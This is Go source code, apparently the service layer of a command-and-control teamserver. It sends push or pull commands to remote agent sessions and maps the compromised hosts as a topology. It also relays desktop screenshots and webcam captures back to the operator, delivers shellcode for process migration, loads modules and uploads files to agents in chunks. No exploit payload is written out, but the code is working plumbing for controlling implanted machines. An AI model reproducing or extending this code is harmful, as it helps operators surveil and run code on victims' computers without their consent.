// 命令下发与会话查询用例。搬运自 api/api.go(sendCommand/listSessions)、
// api/sessions_tasks.go(topology/uploadChunk/hybridCommand 下发段)、cli/cli.go(sendMode/ping/migrateCmd 下发段)。
package service

import (
	"fmt"

	"cleat/teamserver/internal/logx"
	"cleat/teamserver/internal/session"
)

// Command 对会话下发命令并落审计(push 直发/pull 入队)。搬运自 api.sendCommand 主体。
// op 为空(CLI)时不落审计 —— 与搬运前行为一致。
//
// 响应若带混合帧二进制体(Agent 把截图 JPEG 等大载荷放帧体而非 base64 塞 JSON),
// 在此统一提升为 data.image([]byte 经 encoding/json 序列化自动 base64) ——
// 与流转发(handlers.makeStreamForwarder)对 Web 的字段契约同形, 前端零改动。
func (s *Service) Command(op string, sid int, cmd string, params map[string]interface{}, mode string) (map[string]interface{}, error) {
	m := "push"
	if mode == "pull" {
		m = "pull"
	}
	var resp map[string]interface{}
	var err error
	if mode == "pull" {
		resp, err = s.mgr.APIQueueCommand(sid, cmd, params)
	} else {
		resp, err = s.mgr.APICommand(sid, cmd, params)
	}
	if err == nil && resp != nil {
		promoteBinaryToImage(resp)
	}
	status := "ok"
	if err != nil {
		status = "error"
	}
	if op != "" {
		logx.Printf("[audit] op=%s sid=%d cmd=%s mode=%s status=%s\n", op, sid, cmd, m, status)
		s.st.Audit(op, sid, cmd, m, status)
	}
	return resp, err
}

// promoteBinaryToImage 把响应顶层的 __binary__(decodeResponse 挂入的混合帧体)
// 提升为 data.image, 并删除临时键。当前消费方: ScreenShotSingleShot / CameraShot
// (桌面截图 / 摄像头抓拍); 未来出现第二种带体响应时按命令分派字段名。
func promoteBinaryToImage(resp map[string]interface{}) {
	bin, ok := resp["__binary__"].([]byte)
	if !ok {
		return
	}
	delete(resp, "__binary__")
	data, ok := resp["data"].(map[string]interface{})
	if !ok {
		data = map[string]interface{}{}
		resp["data"] = data
	}
	data["image"] = bin
}

// Sessions 全部会话公开信息(原 api.listSessions / cli.list 数据源)。
func (s *Service) Sessions() []session.Info { return s.mgr.SessionInfos() }

// SessionInfo 单会话公开信息(原 cli.info 数据源)。
func (s *Service) SessionInfo(sid int) (session.Info, bool) { return s.mgr.GetSessionInfo(sid) }

// Topology 网络拓扑(节点+连线)。搬运自 api.topology。
func (s *Service) Topology() ([]map[string]interface{}, []map[string]interface{}) {
	nodes := []map[string]interface{}{{
		"id":   "server",
		"type": "server",
		"name": "TeamServer",
	}}
	links := []map[string]interface{}{}
	for _, it := range s.mgr.SessionInfos() {
		nodeID := fmt.Sprintf("agent-%d", it.ID)
		nodes = append(nodes, map[string]interface{}{
			"id":   nodeID,
			"type": "agent",
			"name": it.Hostname,
		})
		links = append(links, map[string]interface{}{
			"source": "server",
			"target": nodeID,
			"type":   "link",
		})
	}
	return nodes, links
}

// MigrateSpawn 下发迁移混合帧(帧二进制体 = shc)。搬运自 cli.migrateCmd 下发段。
func (s *Service) MigrateSpawn(sid int, target string, shc []byte) (map[string]interface{}, error) {
	return s.mgr.APIHybridUpload(sid,
		map[string]interface{}{
			"cmd":    "MigrateSpawn",
			"params": map[string]interface{}{"target": target},
		}, shc)
}

// EnsureModuleSha256 为 hybrid-command 通道的 ModuleLoad
// 补齐 sha256 完整性参数 —— 模块不在仓库或哈希为空即拒绝下发(无法校验的载荷不出门)。
// 调用方已显式提供 sha256 时尊重之(透传)。搬运自 api.ensureModuleSha256(原私有)。
func (s *Service) EnsureModuleSha256(cmd string, params map[string]interface{}) error {
	if cmd != "ModuleLoad" || s.modRepo == nil {
		return nil
	}
	mid, _ := params["module_id"].(string)
	if mid == "" {
		return fmt.Errorf("ModuleLoad 缺少 module_id, 拒绝下发")
	}
	if _, ok := params["sha256"]; ok {
		return nil
	}
	info, err := s.modRepo.Info(mid)
	if err != nil || info.SHA256 == "" {
		return fmt.Errorf("模块 %s 不在仓库中或哈希为空, 拒绝下发", mid)
	}
	params["sha256"] = info.SHA256
	return nil
}

// HybridUpload 通用混合帧下发(JSON头+二进制)。搬运自 api.hybridCommand 下发段
// (ensureModuleSha256 由入口层先行调用, 保持原两条错误路径的 400/500 区分)。
func (s *Service) HybridUpload(sid int, cmd string, params map[string]interface{}, body []byte) (map[string]interface{}, error) {
	return s.mgr.APIHybridUpload(sid, map[string]interface{}{"cmd": cmd, "params": params}, body)
}

// UploadChunk 上传分块(FileUploadData 专用)。搬运自 api.uploadChunk 下发段。
func (s *Service) UploadChunk(sid int, taskID string, chunkIndex int, body []byte) (map[string]interface{}, error) {
	req := map[string]interface{}{
		"cmd": "FileUploadData",
		"params": map[string]interface{}{
			"task_id":     taskID,
			"chunk_index": chunkIndex,
		},
	}
	return s.mgr.APIHybridUpload(sid, req, body)
}
